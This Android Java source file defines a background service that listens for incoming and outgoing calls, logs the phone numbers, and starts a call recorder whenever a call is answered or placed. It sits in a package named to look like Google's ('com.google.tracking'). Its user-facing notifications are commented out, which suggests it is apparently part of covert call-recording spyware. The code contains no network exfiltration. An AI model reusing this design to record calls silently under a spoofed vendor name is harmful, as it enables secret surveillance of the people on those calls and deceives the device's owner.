package com.google.tracking;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.google.tracking.call.CallRecorderController;


public class TService extends Service {


    private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
    private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
    private CallReceiver callReceiver;


    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d("service", "destroy");

        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // final String terminate =(String)
        // intent.getExtras().get("terminate");//
        // intent.getStringExtra("terminate");
        // Log.d("TAG", "service started");
        //
        // TelephonyManager telephony = (TelephonyManager)
        // getSystemService(Context.TELEPHONY_SERVICE); // TelephonyManager
        // // object
        // CustomPhoneStateListener customPhoneListener = new
        // CustomPhoneStateListener();
        // telephony.listen(customPhoneListener,
        // PhoneStateListener.LISTEN_CALL_STATE);
        // context = getApplicationContext();

        final IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_OUT);
        filter.addAction(ACTION_IN);
        this.callReceiver = new CallReceiver();
        this.registerReceiver(this.callReceiver, filter);

        // if(terminate != null) {
        // stopSelf();
        // }
        return START_STICKY;
    }

    public class CallReceiver extends BroadcastReceiver {
        private String log_tag = "CallReceiver";
        Bundle bundle;
        String state;
        String inCall, outCall;
        public boolean wasRinging = false;
        CallRecorderController recorderController;

        public CallReceiver() {
            recorderController = new CallRecorderController();
        }

        @Override
        public void onReceive(Context context, Intent intent) {
//            TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//            telephony.listen(new PhoneStateListener() {
//                @Override
//                public void onCallStateChanged(int state, String incomingNumber) {
//                    super.onCallStateChanged(state, incomingNumber);
//                    Toast.makeText(getApplicationContext(), "incomingNumber:" + " " + incomingNumber, Toast.LENGTH_LONG).show();
//                }
//            }, PhoneStateListener.LISTEN_CALL_STATE);

//            String phoneNumber = getResultData();
//            if (phoneNumber == null) {
//                // No reformatted number, use the original
//                phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//            }

            if (intent.getAction().equals(ACTION_IN)) {
                if ((bundle = intent.getExtras()) != null) {

                    state = bundle.getString(TelephonyManager.EXTRA_STATE);

                    if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {

                        inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
                        wasRinging = true;
//                        Toast.makeText(context, "IN : " + inCall, Toast.LENGTH_LONG).show();
                        Log.d(log_tag, "IN : " + inCall);

                    } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        if (wasRinging == true) {

//                            Toast.makeText(context, "ANSWERED : " + inCall, Toast.LENGTH_LONG).show();
                            Log.d(log_tag, "ANSWERED : " + inCall);
                            recorderController.record(inCall);

                        }
                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        wasRinging = false;
//                        Toast.makeText(context, "REJECT || DISCO : " + inCall, Toast.LENGTH_LONG).show();
                        Log.d(log_tag, "REJECT || DISCO : " + inCall);
                        recorderController.stop();
                    }
                }
            } else if (intent.getAction().equals(ACTION_OUT)) {
                if ((bundle = intent.getExtras()) != null) {
                    outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//                    Toast.makeText(context, "OUT : " + outCall, Toast.LENGTH_LONG).show();
                    Log.d(log_tag, "OUT : " + outCall);
                    recorderController.record(outCall);
                }
            }
        }


    }

}
